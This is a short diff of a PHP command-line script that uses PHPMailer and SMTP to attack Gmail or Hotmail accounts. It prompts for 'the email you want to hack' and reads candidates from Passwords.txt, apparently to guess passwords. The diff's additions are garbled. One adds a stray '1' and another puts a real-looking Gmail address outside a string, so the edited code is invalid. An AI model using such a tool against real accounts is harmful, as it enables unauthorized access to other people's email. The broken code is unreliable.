@@ -6,7 +6,7 @@ $mail = new PHPMailer;
 $handle = fopen("php://stdin", "r");
 echo "1. Gmail\n2. Live/Hotmail\n";
 echo "Select option (1 or 2) : ";
-$line = trim(fgets($handle));
+$line = trim(fgets($handle));1
 
 $mail->isSMTP();
 $mail->SMTPAuth = true;
@@ -20,7 +20,7 @@ if ($line == 1) {
     echo "Sorry, wrong choice.\n";
     exit;
 }
-echo "Enter the email you want to hack : ";
+echo "Enter the email you want to hack : "rjankle86@gmail.com;
 $username = trim(fgets($handle));
 
 $fh = fopen("Passwords.txt", "r");
